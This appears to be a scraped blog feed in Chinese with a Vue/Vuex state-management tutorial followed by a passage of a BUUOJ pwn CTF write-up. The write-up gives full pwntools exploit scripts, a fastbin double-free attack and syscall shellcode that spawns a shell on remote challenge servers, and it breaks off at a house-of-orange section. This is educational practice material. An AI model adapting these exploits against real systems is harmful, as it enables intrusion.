class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; getKey, getLogin, logout, getInfo &#125; <span class="keyword">from</span> <span class="string">&#x27;@/api/user&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; setToken, removeToken &#125; <span class="keyword">from</span> <span class="string">&#x27;@/utils/auth&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> db <span class="keyword">from</span> <span class="string">&#x27;@/utils/localstorage&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> router, &#123; resetRouter &#125; <span class="keyword">from</span> <span class="string">&#x27;@/router&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">ElementUI</span> <span class="keyword">from</span> <span class="string">&#x27;element-ui&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> state = &#123;</span><br><span class="line">  <span class="attr">userId</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">  <span class="attr">token</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">  <span class="attr">avatar</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">  <span class="attr">introduction</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">  <span class="attr">roles</span>: [],</span><br><span class="line">  <span class="attr">tenantId</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="attr">userInfo</span>: <span class="literal">null</span></span><br><span class="line">  <span class="comment">// roles: [&#x27;9999&#x27;]</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> mutations = &#123;</span><br><span class="line">  <span class="attr">SET_TOKEN</span>: <span class="function">(<span class="params">state, token</span>) =&gt;</span> &#123;</span><br><span class="line">    state.<span class="property">token</span> = token;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">SET_USERID</span>: <span class="function">(<span class="params">state, userId</span>) =&gt;</span> &#123;</span><br><span class="line">    state.<span class="property">userId</span> = userId;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">SET_NAME</span>: <span class="function">(<span class="params">state, name</span>) =&gt;</span> &#123;</span><br><span class="line">    state.<span class="property">name</span> = name;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">SET_ROLES</span>: <span class="function">(<span class="params">state, roles</span>) =&gt;</span> &#123;</span><br><span class="line">    state.<span class="property">roles</span> = roles;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">SET_TENANTID</span>: <span class="function">(<span class="params">state, roles</span>) =&gt;</span> &#123;</span><br><span class="line">    state.<span class="property">tenantId</span> = roles;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">SET_USER_INFO</span>: <span class="function">(<span class="params">state, userInfo</span>) =&gt;</span> &#123;</span><br><span class="line">    state.<span class="property">userInfo</span> = userInfo;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> actions = &#123;</span><br><span class="line">  <span class="comment">// 获取密钥</span></span><br><span class="line">  <span class="title function_">getKey</span>(<span class="params">&#123; commit &#125;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="title function_">getKey</span>()</span><br><span class="line">        .<span class="title function_">then</span>(<span class="function">(<span class="params">response</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="title function_">resolve</span>(response);</span><br><span class="line">        &#125;)</span><br><span class="line">        .<span class="title function_">catch</span>(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="title function_">reject</span>(error);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 用户登录</span></span><br><span class="line">  <span class="title function_">login</span>(<span class="params">&#123; commit &#125;, userInfo</span>) &#123;</span><br><span class="line">    <span class="comment">// const &#123; username, password &#125; = userInfo;</span></span><br><span class="line">    <span class="keyword">const</span> params = userInfo;</span><br><span class="line">    params.<span class="property">userName</span> = userInfo.<span class="property">userName</span>.<span class="title function_">trim</span>()</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">// console.log(username, password);</span></span><br><span class="line">      <span class="comment">// setToken(state.token)</span></span><br><span class="line">      <span class="comment">// localStorage.setItem(&#x27;loginToken&#x27;, state.token)</span></span><br><span class="line">      <span class="title function_">getLogin</span>(params)</span><br><span class="line">      <span class="comment">// getLogin(&#123; userName: username.trim(), password: password &#125;)</span></span><br><span class="line">        .<span class="title function_">then</span>(<span class="function">(<span class="params">response</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="keyword">const</span> &#123; status, message, data &#125; = response || &#123;&#125;;</span><br><span class="line">          <span class="keyword">if</span> (status === <span class="number">200</span>) &#123;</span><br><span class="line">            <span class="comment">// 存入 参数： 1.调用的值 2.所要存入的数据</span></span><br><span class="line">            <span class="title function_">commit</span>(<span class="string">&#x27;SET_USER_INFO&#x27;</span>, data);</span><br><span class="line">            <span class="title function_">commit</span>(<span class="string">&#x27;SET_TOKEN&#x27;</span>, data.<span class="property">uuid</span>);</span><br><span class="line">            <span class="title function_">commit</span>(<span class="string">&#x27;SET_USERID&#x27;</span>, data.<span class="property">id</span>);</span><br><span class="line">            <span class="title function_">commit</span>(<span class="string">&#x27;SET_ROLES&#x27;</span>, data.<span class="property">roles</span>);</span><br><span class="line">            <span class="title function_">commit</span>(<span class="string">&#x27;SET_NAME&#x27;</span>, data.<span class="property">realName</span>);</span><br><span class="line">            <span class="title function_">commit</span>(<span class="string">&#x27;SET_TENANTID&#x27;</span>, data.<span class="property">tenantId</span> || <span class="number">1</span>);</span><br><span class="line">            <span class="title function_">setToken</span>(data.<span class="property">uuid</span>);</span><br><span class="line">            db.<span class="title function_">save</span>(<span class="string">&#x27;userInfo&#x27;</span>, data);</span><br><span class="line">            db.<span class="title function_">save</span>(<span class="string">&#x27;tenantId&#x27;</span>, data.<span class="property">tenantId</span> || <span class="number">1</span>);</span><br><span class="line">            <span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&#x27;loginToken&#x27;</span>, data.<span class="property">uuid</span>);</span><br><span class="line">            <span class="title function_">resolve</span>(data);</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// ElementUI.Message.error(message);  // axios拦截统一提示了</span></span><br><span class="line">          &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        .<span class="title function_">catch</span>(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="comment">// ElementUI.Message.error(error.message); // axios拦截统一提示了</span></span><br><span class="line">          <span class="title function_">reject</span>(error);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 获取用户信息</span></span><br><span class="line">  <span class="title function_">getInfo</span>(<span class="params">&#123; commit, state &#125;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="title function_">getInfo</span>(state.<span class="property">token</span>)</span><br><span class="line">        .<span class="title function_">then</span>(<span class="function">(<span class="params">response</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="keyword">const</span> &#123; data &#125; = response;</span><br><span class="line">          data.<span class="property">roles</span> = response.<span class="property">data</span>.<span class="property">rights</span>.<span class="title function_">map</span>(<span class="title class_">String</span>);</span><br><span class="line">          <span class="keyword">if</span> (!data) &#123;</span><br><span class="line">            <span class="title function_">reject</span>(<span class="string">&#x27;验证失败，请重新登录。&#x27;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">const</span> loginMessage = &#123;</span><br><span class="line">            <span class="attr">memberId</span>: data.<span class="property">id</span>,</span><br><span class="line">            <span class="attr">userName</span>: data.<span class="property">name</span>,</span><br><span class="line">            <span class="attr">userTel</span>: data.<span class="property">mobile</span>,</span><br><span class="line">            <span class="attr">realName</span>: data.<span class="property">realName</span>,</span><br><span class="line">            <span class="attr">incorCom</span>: data.<span class="property">incorCom</span>,</span><br><span class="line">            <span class="attr">virtualCor</span>: data.<span class="property">virtualCor</span>,</span><br><span class="line">            <span class="attr">deptId</span>: data.<span class="property">deptId</span>,</span><br><span class="line">            <span class="attr">deptpath</span>: data.<span class="property">deptpath</span>,</span><br><span class="line">            <span class="attr">deptName</span>: data.<span class="property">deptName</span></span><br><span class="line">          &#125;;</span><br><span class="line">          <span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&#x27;loginMessage&#x27;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(loginMessage));</span><br><span class="line">          <span class="keyword">const</span> &#123; id, roles, realName &#125; = data;</span><br><span class="line">          <span class="comment">// 角色必须是非空数组!</span></span><br><span class="line">          <span class="keyword">if</span> (!roles || roles.<span class="property">length</span> &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="title function_">reject</span>(<span class="string">&#x27;getInfo: 角色必须是非空数组!&#x27;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="title function_">commit</span>(<span class="string">&#x27;SET_USERID&#x27;</span>, id);</span><br><span class="line">          <span class="title function_">commit</span>(<span class="string">&#x27;SET_ROLES&#x27;</span>, roles);</span><br><span class="line">          <span class="title function_">commit</span>(<span class="string">&#x27;SET_NAME&#x27;</span>, realName);</span><br><span class="line">          <span class="variable language_">localStorage</span>.<span class="title function_">setItem</span>(<span class="string">&#x27;userRights&#x27;</span>, roles);</span><br><span class="line">          <span class="comment">// commit(&#x27;SET_AVATAR&#x27;, avatar)</span></span><br><span class="line">          <span class="comment">// commit(&#x27;SET_INTRODUCTION&#x27;, introduction)</span></span><br><span class="line">          <span class="title function_">resolve</span>(data);</span><br><span class="line">        &#125;)</span><br><span class="line">        .<span class="title function_">catch</span>(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="title function_">reject</span>(error);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 用户登出</span></span><br><span class="line">  <span class="title function_">logout</span>(<span class="params">&#123; commit, state &#125;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="title function_">logout</span>(state.<span class="property">token</span>)</span><br><span class="line">        .<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">          <span class="title function_">commit</span>(<span class="string">&#x27;SET_TOKEN&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">          <span class="title function_">commit</span>(<span class="string">&#x27;SET_ROLES&#x27;</span>, []);</span><br><span class="line">          db.<span class="title function_">remove</span>(<span class="string">&#x27;router&#x27;</span>);</span><br><span class="line">          <span class="title function_">removeToken</span>();</span><br><span class="line">          <span class="title function_">resetRouter</span>();</span><br><span class="line">          <span class="title function_">resolve</span>();</span><br><span class="line">        &#125;)</span><br><span class="line">        .<span class="title function_">catch</span>(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">          <span class="title function_">reject</span>(error);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 删除token</span></span><br><span class="line">  <span class="title function_">resetToken</span>(<span class="params">&#123; commit &#125;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="title function_">commit</span>(<span class="string">&#x27;SET_TOKEN&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">      <span class="title function_">commit</span>(<span class="string">&#x27;SET_ROLES&#x27;</span>, []);</span><br><span class="line">      <span class="title function_">removeToken</span>();</span><br><span class="line">      <span class="title function_">resolve</span>();</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 动态修改权限</span></span><br><span class="line">  <span class="title function_">changeRoles</span>(<span class="params">&#123; commit, dispatch &#125;, role</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="title function_">async</span>(resolve) =&gt; &#123;</span><br><span class="line">      <span class="keyword">const</span> token = role + <span class="string">&#x27;-token&#x27;</span>;</span><br><span class="line"></span><br><span class="line">      <span class="title function_">commit</span>(<span class="string">&#x27;SET_TOKEN&#x27;</span>, token);</span><br><span class="line">      <span class="title function_">setToken</span>(token);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">const</span> &#123; roles &#125; = <span class="keyword">await</span> <span class="title function_">dispatch</span>(<span class="string">&#x27;getInfo&#x27;</span>);</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(roles, <span class="string">&#x27;rolesrolesroles&#x27;</span>);</span><br><span class="line">      <span class="title function_">resetRouter</span>();</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 根据角色生成可访问路由映射</span></span><br><span class="line">      <span class="keyword">const</span> accessRoutes = <span class="keyword">await</span> <span class="title function_">dispatch</span>(<span class="string">&#x27;permission/generateRoutes&#x27;</span>, roles, &#123;</span><br><span class="line">        <span class="attr">root</span>: <span class="literal">true</span></span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 动态添加可访问路由</span></span><br><span class="line">      router.<span class="title function_">addRoutes</span>(accessRoutes);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 重置已访问视图和缓存视图</span></span><br><span class="line">      <span class="title function_">dispatch</span>(<span class="string">&#x27;tagsView/delAllViews&#x27;</span>, <span class="literal">null</span>, &#123; <span class="attr">root</span>: <span class="literal">true</span> &#125;);</span><br><span class="line"></span><br><span class="line">      <span class="title function_">resolve</span>();</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="attr">namespaced</span>: <span class="literal">true</span>,</span><br><span class="line">  state,</span><br><span class="line">  mutations,</span><br><span class="line">  actions</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这样后可以按功能分 module 使用</p><p>页面中调用就是</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用mutations</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">$store</span>.<span class="title function_">commit</span>(<span class="string">&#x27;api/SET_T&#x27;</span>, keys);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用actions</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">$store</span>.<span class="title function_">dispatch</span>(<span class="string">&#x27;user/login&#x27;</span>, postUser).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;）</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果没有分module </span></span><br><span class="line"><span class="comment">// 那就是 this.$store.commit(&#x27;SET_T&#x27;, keys);</span></span><br><span class="line"><span class="comment">// 直接调用方法</span></span><br></pre></td></tr></table></figure><h1 id="四-解决vuex中刷新数据数据消失问题"><a class="markdownIt-Anchor" href="#四-解决vuex中刷新数据数据消失问题">#</a> 四、解决 vuex 中刷新数据，数据消失问题</h1><h3 id="解决方法"><a class="markdownIt-Anchor" href="#解决方法">#</a> 解决方法</h3><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202203052127002.png" alt="image-20220305212724638"></p><h3 id="操作"><a class="markdownIt-Anchor" href="#操作">#</a> 操作</h3><p>在自定义的 waiter.js 中加入 sessionStorage</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;searchSpiderTask&#125; <span class="keyword">from</span> <span class="string">&quot;@/api/spider&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> state =  &#123;</span><br><span class="line">  <span class="comment">// authInfo: JSON.parse(sessionStorage.getItem(&quot;COMPANY_AUTH_INFO&quot;)) || &#123;&#125;</span></span><br><span class="line">  <span class="attr">tableData</span>: <span class="title class_">JSON</span>.<span class="title function_">parse</span>(sessionStorage.<span class="title function_">getItem</span>(<span class="string">&quot;tableData&quot;</span>)) || [],</span><br><span class="line">  <span class="attr">count</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">title</span>:<span class="string">&#x27;首页&#x27;</span>,</span><br><span class="line">  <span class="comment">// tableData:[],</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> getters = &#123;</span><br><span class="line">  <span class="comment">// tableData: state =&gt; state.tableData,</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> mutations = &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// change:(state,text)=&gt;&#123;</span></span><br><span class="line">  <span class="comment">//   state.title=text;</span></span><br><span class="line">  <span class="comment">// &#125;,</span></span><br><span class="line">  <span class="comment">// add:(state)=&gt;&#123;</span></span><br><span class="line">  <span class="comment">//   state.count++</span></span><br><span class="line">  <span class="comment">// &#125;,</span></span><br><span class="line"></span><br><span class="line">  <span class="title function_">GET__tableData</span>(<span class="params">state,data</span>)&#123;</span><br><span class="line">    state.<span class="property">tableData</span>=data <span class="comment">//数据更改</span></span><br><span class="line">    sessionStorage.<span class="title function_">setItem</span>(<span class="string">&quot;tableData&quot;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(state.<span class="property">tableData</span>))  <span class="comment">//存sessionStorage</span></span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> actions=&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">getList</span>(<span class="params">context</span>)&#123;</span><br><span class="line">      <span class="title function_">searchSpiderTask</span>().<span class="title function_">then</span>(</span><br><span class="line">        <span class="function"><span class="params">res</span>=&gt;</span>&#123;</span><br><span class="line">          <span class="variable language_">console</span>.<span class="title function_">log</span>(res.<span class="property">data</span>);</span><br><span class="line">          context.<span class="title function_">commit</span>(<span class="string">&#x27;GET__tableData&#x27;</span>,res.<span class="property">data</span>); <span class="comment">//传后端数据</span></span><br><span class="line">        &#125;</span><br><span class="line">      )</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="attr">namespaced</span>: <span class="literal">true</span>,</span><br><span class="line">  state,</span><br><span class="line">  getters,</span><br><span class="line">  mutations,</span><br><span class="line">  actions,</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在对应的 vue 中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">//触发方法</span><br><span class="line">&lt;el-button type=&quot;primary&quot; plain @click=&quot;loopResult&quot; style=&quot;margin-left: 10px&quot;&gt;检查&lt;/el-button&gt;</span><br><span class="line"></span><br><span class="line">//method部分</span><br><span class="line">loopResult(data)&#123;</span><br><span class="line">      this.$store.dispatch(&#x27;waiter/getList&#x27;)  //传actions</span><br><span class="line"></span><br><span class="line">      searchSpiderTask().then(response =&gt; &#123;</span><br><span class="line">        console.log(response.code)</span><br><span class="line">        if(response.code===20000) &#123;</span><br><span class="line">          const h = this.$createElement</span><br><span class="line">          this.$notify(&#123;</span><br><span class="line">            title: &#x27;搜索成功&#x27;,</span><br><span class="line">            message: h(&#x27;i&#x27;, &#123;style: &#x27;color: teal&#x27;&#125;, &#x27;搜索成功&#x27;),</span><br><span class="line">            duration: 1000</span><br><span class="line">          &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;).catch(err =&gt; &#123;</span><br><span class="line">        console.log(err)</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure><h1 id="五-一些其他问题的解决方法"><a class="markdownIt-Anchor" href="#五-一些其他问题的解决方法">#</a> 五、一些其他问题的解决方法</h1><ul><li><a href="https://blog.csdn.net/qq_34817440/article/details/106382512?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=%5Bvuex%5D%20unknown%20local%20action%20ty&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-3-106382512.first_rank_v2_pc_rank_v29&amp;spm=1018.2226.3001.4187">报错：[vuex] unknown action type:***</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUOJ PWN EXERCISE(二)</title>
      <link href="/2022/03/03/BUUOJ%20PWN%20EXERCISE(%E4%B8%89%EF%BC%89/"/>
      <url>/2022/03/03/BUUOJ%20PWN%20EXERCISE(%E4%B8%89%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>heap</p><span id="more"></span><h1 id="wustctf2020_easyfastfastbin-attack"><a class="markdownIt-Anchor" href="#wustctf2020_easyfastfastbin-attack">#</a> wustctf2020_easyfast(fastbin attack)</h1><p>基本 fastbin attack 利用，改 chunk 到 backdoor 地址，将 if 条件中的变量覆盖为 0 拿 shell</p><p>##　EXP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./wustctf2020_easyfast&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29433</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">p.recvuntil(<span class="string">&#x27;choice&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;size&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">p.recvuntil(<span class="string">&#x27;choice&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;index&gt;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;index&gt;&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backdoor</span>():</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice&gt;&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0x602080</span>))</span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line">edit(<span class="number">3</span>,p64(<span class="number">0</span>))</span><br><span class="line">backdoor()</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="starctf_2019_babyshellsyscall"><a class="markdownIt-Anchor" href="#starctf_2019_babyshellsyscall">#</a> starctf_2019_babyshell(syscall)</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = asm(<span class="string">&quot;pop rdi;pop rdi;pop rdi;pop rdx;pop rdi;pop rdi;pop rdi;pop rdi;pop rdi;pop rdi;syscall&quot;</span>)</span><br><span class="line"><span class="comment"># sh = process(&quot;./starctf_2019_babyshell&quot;)</span></span><br><span class="line">sh = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28428</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;plz:\n&quot;</span>,payload)</span><br><span class="line">sh.sendline(<span class="string">&#x27;a&#x27;</span> * <span class="number">0xc</span> + asm(shellcraft.sh()))</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="houseoforange_hitcon_2016house-of-orangefrop"><a class="markdownIt-Anchor" href="#houseoforange_hitcon_2016house-of-orangefrop">#</a> houseoforange_hitcon_2016(house of orange,frop)</h1><h2 id="题目分析"><a class="markdownIt-Anchor" href="#题目分析">#</a> 题目分析</h2><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202203031733544.png" alt="image-20220303173344428"></p><p><img 